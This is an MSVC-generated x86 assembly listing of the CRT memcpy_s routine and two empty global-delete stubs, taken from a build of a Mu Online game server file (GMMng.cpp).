__Destination$ = 8					; size = 4
__DestinationSize$ = 12					; size = 4
__Source$ = 16						; size = 4
__SourceSize$ = 20					; size = 4
_memcpy_s PROC						; COMDAT

; 41   :     {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 50	 sub	 esp, 80			; 00000050H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi

; 42   :         if (_SourceSize == 0)

  00009	83 7d 14 00	 cmp	 DWORD PTR __SourceSize$[ebp], 0
  0000d	75 07		 jne	 SHORT $LN2@memcpy_s

; 43   :         {
; 44   :             return 0;

  0000f	33 c0		 xor	 eax, eax
  00011	e9 f1 00 00 00	 jmp	 $LN1@memcpy_s
$LN2@memcpy_s:

; 45   :         }
; 46   : 
; 47   :         _CRT_MEMCPY_S_VALIDATE_RETURN_ERRCODE(_Destination != NULL, EINVAL);

  00016	83 7d 08 00	 cmp	 DWORD PTR __Destination$[ebp], 0
  0001a	74 09		 je	 SHORT $LN9@memcpy_s
  0001c	c7 45 b0 01 00
	00 00		 mov	 DWORD PTR tv66[ebp], 1
  00023	eb 07		 jmp	 SHORT $LN10@memcpy_s
$LN9@memcpy_s:
  00025	c7 45 b0 00 00
	00 00		 mov	 DWORD PTR tv66[ebp], 0
$LN10@memcpy_s:
  0002c	8b 45 b0	 mov	 eax, DWORD PTR tv66[ebp]
  0002f	89 45 fc	 mov	 DWORD PTR __Expr_val$3[ebp], eax
  00032	83 7d fc 00	 cmp	 DWORD PTR __Expr_val$3[ebp], 0
  00036	75 1a		 jne	 SHORT $LN3@memcpy_s
  00038	e8 00 00 00 00	 call	 __errno
  0003d	c7 00 16 00 00
	00		 mov	 DWORD PTR [eax], 22	; 00000016H
  00043	e8 00 00 00 00	 call	 __invalid_parameter_noinfo
  00048	b8 16 00 00 00	 mov	 eax, 22			; 00000016H
  0004d	e9 b5 00 00 00	 jmp	 $LN1@memcpy_s
$LN3@memcpy_s:

; 48   :         if (_Source == NULL || _DestinationSize < _SourceSize)

  00052	83 7d 10 00	 cmp	 DWORD PTR __Source$[ebp], 0
  00056	74 0c		 je	 SHORT $LN5@memcpy_s
  00058	8b 45 0c	 mov	 eax, DWORD PTR __DestinationSize$[ebp]
  0005b	3b 45 14	 cmp	 eax, DWORD PTR __SourceSize$[ebp]
  0005e	0f 83 8d 00 00
	00		 jae	 $LN4@memcpy_s
$LN5@memcpy_s:

; 49   :         {
; 50   :             memset(_Destination, 0, _DestinationSize);

  00064	8b 45 0c	 mov	 eax, DWORD PTR __DestinationSize$[ebp]
  00067	50		 push	 eax
  00068	6a 00		 push	 0
  0006a	8b 4d 08	 mov	 ecx, DWORD PTR __Destination$[ebp]
  0006d	51		 push	 ecx
  0006e	e8 00 00 00 00	 call	 _memset
  00073	83 c4 0c	 add	 esp, 12			; 0000000cH

; 51   : 
; 52   :             _CRT_MEMCPY_S_VALIDATE_RETURN_ERRCODE(_Source != NULL,                 EINVAL);

  00076	83 7d 10 00	 cmp	 DWORD PTR __Source$[ebp], 0
  0007a	74 09		 je	 SHORT $LN11@memcpy_s
  0007c	c7 45 b0 01 00
	00 00		 mov	 DWORD PTR tv75[ebp], 1
  00083	eb 07		 jmp	 SHORT $LN12@memcpy_s
$LN11@memcpy_s:
  00085	c7 45 b0 00 00
	00 00		 mov	 DWORD PTR tv75[ebp], 0
$LN12@memcpy_s:
  0008c	8b 45 b0	 mov	 eax, DWORD PTR tv75[ebp]
  0008f	89 45 f8	 mov	 DWORD PTR __Expr_val$2[ebp], eax
  00092	83 7d f8 00	 cmp	 DWORD PTR __Expr_val$2[ebp], 0
  00096	75 17		 jne	 SHORT $LN6@memcpy_s
  00098	e8 00 00 00 00	 call	 __errno
  0009d	c7 00 16 00 00
	00		 mov	 DWORD PTR [eax], 22	; 00000016H
  000a3	e8 00 00 00 00	 call	 __invalid_parameter_noinfo
  000a8	b8 16 00 00 00	 mov	 eax, 22			; 00000016H
  000ad	eb 58		 jmp	 SHORT $LN1@memcpy_s
$LN6@memcpy_s:

; 53   :             _CRT_MEMCPY_S_VALIDATE_RETURN_ERRCODE(_DestinationSize >= _SourceSize, ERANGE);

  000af	8b 45 0c	 mov	 eax, DWORD PTR __DestinationSize$[ebp]
  000b2	3b 45 14	 cmp	 eax, DWORD PTR __SourceSize$[ebp]
  000b5	72 09		 jb	 SHORT $LN13@memcpy_s
  000b7	c7 45 b0 01 00
	00 00		 mov	 DWORD PTR tv79[ebp], 1
  000be	eb 07		 jmp	 SHORT $LN14@memcpy_s
$LN13@memcpy_s:
  000c0	c7 45 b0 00 00
	00 00		 mov	 DWORD PTR tv79[ebp], 0
$LN14@memcpy_s:
  000c7	8b 4d b0	 mov	 ecx, DWORD PTR tv79[ebp]
  000ca	89 4d f4	 mov	 DWORD PTR __Expr_val$1[ebp], ecx
  000cd	83 7d f4 00	 cmp	 DWORD PTR __Expr_val$1[ebp], 0
  000d1	75 17		 jne	 SHORT $LN7@memcpy_s
  000d3	e8 00 00 00 00	 call	 __errno
  000d8	c7 00 22 00 00
	00		 mov	 DWORD PTR [eax], 34	; 00000022H
  000de	e8 00 00 00 00	 call	 __invalid_parameter_noinfo
  000e3	b8 22 00 00 00	 mov	 eax, 34			; 00000022H
  000e8	eb 1d		 jmp	 SHORT $LN1@memcpy_s
$LN7@memcpy_s:

; 54   : 
; 55   :             // Unreachable, but required to suppress /analyze warnings:
; 56   :             return EINVAL;

  000ea	b8 16 00 00 00	 mov	 eax, 22			; 00000016H
  000ef	eb 16		 jmp	 SHORT $LN1@memcpy_s
$LN4@memcpy_s:

; 57   :         }
; 58   : #pragma warning(suppress:4996) // Deprecation
; 59   :         memcpy(_Destination, _Source, _SourceSize);

  000f1	8b 45 14	 mov	 eax, DWORD PTR __SourceSize$[ebp]
  000f4	50		 push	 eax
  000f5	8b 4d 10	 mov	 ecx, DWORD PTR __Source$[ebp]
  000f8	51		 push	 ecx
  000f9	8b 55 08	 mov	 edx, DWORD PTR __Destination$[ebp]
  000fc	52		 push	 edx
  000fd	e8 00 00 00 00	 call	 _memcpy
  00102	83 c4 0c	 add	 esp, 12			; 0000000cH

; 60   :         return 0;

  00105	33 c0		 xor	 eax, eax
$LN1@memcpy_s:

; 61   :     }

  00107	5f		 pop	 edi
  00108	5e		 pop	 esi
  00109	5b		 pop	 ebx
  0010a	8b e5		 mov	 esp, ebp
  0010c	5d		 pop	 ebp
  0010d	c3		 ret	 0
_memcpy_s ENDP
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
;	COMDAT ?__empty_global_delete@@YAXPAXI@Z
_TEXT	SEGMENT
___formal$ = 8						; size = 4
___formal$ = 12						; size = 4
?__empty_global_delete@@YAXPAXI@Z PROC			; __empty_global_delete, COMDAT

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 40	 sub	 esp, 64			; 00000040H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	5f		 pop	 edi
  0000a	5e		 pop	 esi
  0000b	5b		 pop	 ebx
  0000c	8b e5		 mov	 esp, ebp
  0000e	5d		 pop	 ebp
  0000f	c3		 ret	 0
?__empty_global_delete@@YAXPAXI@Z ENDP			; __empty_global_delete
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
;	COMDAT ?__empty_global_delete@@YAXPAX@Z
_TEXT	SEGMENT
___formal$ = 8						; size = 4
?__empty_global_delete@@YAXPAX@Z PROC			; __empty_global_delete, COMDAT

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 40	 sub	 esp, 64			; 00000040H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	5f		 pop	 edi
  0000a	5e		 pop	 esi
  0000b	5b		 pop	 ebx
  0000c	8b e5		 mov	 esp, ebp
  0000e	5d		 pop	 ebp
  0000f	c3		 ret	 0
?__empty_global_delete@@YAXPAX@Z ENDP			; __empty_global_delete
_TEXT	ENDS
END
